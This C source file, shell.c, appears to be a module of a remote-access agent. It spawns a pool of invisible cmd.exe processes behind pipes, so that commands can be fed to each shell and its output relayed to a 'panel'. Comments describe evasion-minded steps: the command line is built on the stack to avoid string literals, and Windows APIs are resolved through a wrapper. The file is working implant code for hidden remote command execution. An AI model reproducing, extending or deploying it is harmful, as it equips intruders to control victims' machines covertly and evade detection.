/* shell.c - the cmd.exe pool (see shell.h).
 */

#include "types.h"
#include "shell.h"
#include "kernel32.h"
#include "memory.h"
#include "stackstrings.h"

/* C1 step 2: no static pool. agent_main() owns the array on its frame
 * (its lifetime = the process) and passes it to every pool function.
 * Zero-init happens in agent_main's frame - slots start free. */

/* ---------------------------------------------------------------------------
 * shell_spawn - create cmd.exe behind two pipes and record it in *slot.
 *
 * "cmd.exe /K chcp 65001 >nul" switches the code page to UTF-8 at startup
 * while keeping the shell interactive; the panel decodes our chunks as
 * UTF-8, so this is what makes non-ASCII output readable there.
 * ------------------------------------------------------------------------- */
int shell_spawn(shell_slot *slot)
{
    SECURITY_ATTRIBUTES inheritable = { sizeof(inheritable), NULL, TRUE };
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return 1;

    HANDLE stdin_r  = NULL, stdin_w  = NULL;    /* child reads / we write  */
    HANDLE stdout_r = NULL, stdout_w = NULL;    /* we read  / child writes */

    if (!kernel.CreatePipe(&stdin_r,  &stdin_w,  &inheritable, 0)) return 1;
    if (!kernel.CreatePipe(&stdout_r, &stdout_w, &inheritable, 0)) {
        kernel.CloseHandle(stdin_r); kernel.CloseHandle(stdin_w);
        return 1;
    }

    /* Only the child's ends may be inherited; if ours were inherited too,
     * a second cmd.exe would keep the pipes alive after this one exits and
     * EOF would never reach us. */
    kernel.SetHandleInformation(stdin_w,  HANDLE_FLAG_INHERIT, 0);
    kernel.SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si;
    MemoryZero(&si, sizeof(si));
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = stdin_r;     /* child: read commands   */
    si.hStdOutput = stdout_w;    /* child: write output    */
    si.hStdError  = stdout_w;    /* child: stderr -> same pipe (merged) */

    PROCESS_INFORMATION pi;
    MemoryZero(&pi, sizeof(pi));

    /* CREATE_NO_WINDOW: cmd.exe runs fully invisible; /K keeps it alive
     * after the chcp command completes. The command line MUST be a
     * writable buffer: CreateProcessW is documented to modify it in place,
     * so a string literal (read-only .rdata) crashes inside the call. */
    /* C1 step 3b: the command line is stack-built (no .rdata literal);
     * still a WRITABLE frame buffer - CreateProcessW modifies it in place. */
    WCHAR cmdline[27];
    StrCmdline(cmdline);
    BOOL ok = kernel.CreateProcessW(NULL, cmdline,
                             NULL, NULL, TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);

    /* The child owns its ends now (duplicated into it at spawn). Close our
     * references so the pipe EOF reflects the child - and only the child. */
    kernel.CloseHandle(stdin_r);
    kernel.CloseHandle(stdout_w);

    if (!ok) {
        kernel.CloseHandle(stdin_w);
        kernel.CloseHandle(stdout_r);
        return 1;
    }

    kernel.CloseHandle(pi.hThread);            /* not needed - idles anyway */
    slot->in_use  = 1;
    slot->stdin_w = stdin_w;
    slot->stdout_r = stdout_r;
    slot->process = pi.hProcess;
    return 0;
}

/* Find a free pool slot, spawn cmd.exe into it, return its index
 * (the protocol shell id). -1 = pool full or spawn failed. */
int shell_open(shell_slot pool[])
{
    for (int i = 0; i < SHELL_POOL_SIZE; i++) {
        if (!pool[i].in_use) {
            if (shell_spawn(&pool[i]) == 0)
                return i;
            return -1;          /* spawn failed; the slot stayed free */
        }
    }
    return -1;                  /* pool full */
}

/* Release everything a slot owns. Safe on a partially-filled slot. */
void shell_teardown(shell_slot *slot)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return;
    
    if (!slot->in_use)
        return;
    if (slot->process) {
        kernel.TerminateProcess(slot->process, 0);
        kernel.CloseHandle(slot->process);
    }
    if (slot->stdin_w)   kernel.CloseHandle(slot->stdin_w);
    if (slot->stdout_r)  kernel.CloseHandle(slot->stdout_r);
    MemoryZero(slot, sizeof(*slot));
}

/* Map a protocol shell id to its slot, or NULL when never opened/closed. */
shell_slot *shell_lookup(shell_slot pool[], unsigned long long id)
{
    if (id >= SHELL_POOL_SIZE || !pool[id].in_use)
        return NULL;
    return &pool[id];
}

/* ---------------------------------------------------------------------------
 * shell_write - feed bytes to the shell's stdin.
 * Returns 0 on success; on failure the shell is dead and torn down.
 * ------------------------------------------------------------------------- */
int shell_write(shell_slot *slot, const void *data, DWORD len)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return 1;

    DWORD written = 0;
    if (!kernel.WriteFile(slot->stdin_w, data, len, &written, NULL) ||
        written != len) {
        shell_teardown(slot);
        return 1;
    }
    return 0;
}

/* ---------------------------------------------------------------------------
 * shell_read - drain up to cap bytes of buffered output, never blocking
 * (see shell.h).
 * ------------------------------------------------------------------------- */
int shell_read(shell_slot *slot, unsigned char *out, DWORD cap,
               DWORD *out_len)
{
    KERNEL32 kernel;
    if (!KERNEL32_Ctor(&kernel))
        return SHELL_READ_DEAD;

    DWORD available = 0;
    if (!kernel.PeekNamedPipe((HANDLE)slot->stdout_r, NULL, 0, NULL, &available, NULL)) {
        /* The pipe is broken: cmd.exe has exited. Drain what is left and
         * free the slot; the next ReadShell reports status 1. */
        shell_teardown(slot);
        return SHELL_READ_DEAD;
    }
    if (available == 0)
        return SHELL_READ_IDLE;

    if (cap > available)
        cap = available;
    DWORD got = 0;
    if (!kernel.ReadFile((HANDLE)slot->stdout_r, out, cap, &got, NULL) || got == 0) {
        shell_teardown(slot);
        return SHELL_READ_DEAD;
    }
    *out_len = got;
    return SHELL_READ_OK;
}

/* Tear down every live shell (agent shutdown - no orphaned cmd.exe). */
void shell_teardown_all(shell_slot pool[])
{
    for (int i = 0; i < SHELL_POOL_SIZE; i++)
        shell_teardown(&pool[i]);
}
